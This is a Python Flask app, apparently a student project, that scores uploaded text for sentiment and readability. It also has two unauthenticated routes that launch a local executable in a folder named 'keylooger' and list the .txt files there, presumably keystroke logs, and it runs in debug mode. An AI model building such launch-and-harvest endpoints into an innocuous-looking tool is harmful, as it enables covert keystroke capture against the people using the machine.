from flask import Flask, request, render_template, redirect, url_for, jsonify
import os
import re
import nltk
import subprocess
from nltk.corpus import stopwords
from nltk.stem import WordNetLemmatizer
from nltk.tokenize import sent_tokenize, word_tokenize

app = Flask(__name__)

def load_stopwords():
    stop_words = set(stopwords.words('english'))
    stopwords_dir = 'stopwords'
    for file_name in os.listdir(stopwords_dir):
        with open(os.path.join(stopwords_dir, file_name), 'r') as file:
            words = file.read()
            words = re.sub(r'[^\w\s]', '', words)
            words = word_tokenize(words)
            stop_words.update(words)
    return stop_words

stop_words = load_stopwords()
lemmatizer = WordNetLemmatizer()

def analyze_text(text):
    pos_words = open('positive-words.txt', 'r').read().split()
    neg_words = open('negative-words.txt', 'r').read().split()
    temp = text

    text = re.sub(r'[^\w\s]', '', text)
    words = word_tokenize(text)
    words = [w for w in words if not w in stop_words]
    words = [lemmatizer.lemmatize(word) for word in words]

    pos_score = sum(1 for word in words if word in pos_words)
    neg_score = sum(1 for word in words if word in neg_words)
    polarity = (pos_score - neg_score) / (pos_score + neg_score + 0.000001)
    subjectivity = (pos_score + neg_score) / (len(words) + 0.000001)

    sentences = sent_tokenize(temp)
    avg_sentence_length = len(words) / len(sentences)
    complex_words_count = sum(1 for word in words if sum(1 for char in word if char in 'aeiouAEIOU') >= 2)
    percent_complex_words = (complex_words_count / len(words)) * 100
    fog_index = 0.4 * (avg_sentence_length + percent_complex_words)
    avg_syllables_per_word = sum(sum(1 for char in word if char in 'aeiouAEIOU') for word in words) / len(words)
    pronouns = sum(1 for word in words if word.lower() in ['i', 'we', 'my', 'ours', 'us'])
    avg_word_length = sum(len(word) for word in words) / len(words)

    results = {
        'Positive Score': pos_score,
        'Negative Score': neg_score,
        'Polarity': polarity,
        'Subjectivity': subjectivity,
        'Average Sentence Length': avg_sentence_length,
        'Complex Words(%)': percent_complex_words,
        'Fog Index': fog_index,
        'Syllables': avg_syllables_per_word,
        'Pronouns': pronouns,
        'Average Word Len': avg_word_length
    }
    return results



@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            return redirect(request.url)
        if file:
            text = file.read().decode('utf-8')
            results = analyze_text(text)
            return render_template('results.html', results=results)
    return render_template('upload.html')

@app.route('/run_app', methods=['POST'])
def run_app():
    app_path = "C:\\Users\\SURESH CHOUDHARY H\\last_phase_project\\keylooger\\try.exe"
    try:
        subprocess.Popen(app_path)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/list_files', methods=['GET'])
def list_files():
    directory = "C:\\Users\\SURESH CHOUDHARY H\\last_phase_project\\keylooger"
    try:
        files = [f for f in os.listdir(directory) if f.endswith('.txt')]
        return jsonify({'status': 'success', 'files': files}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
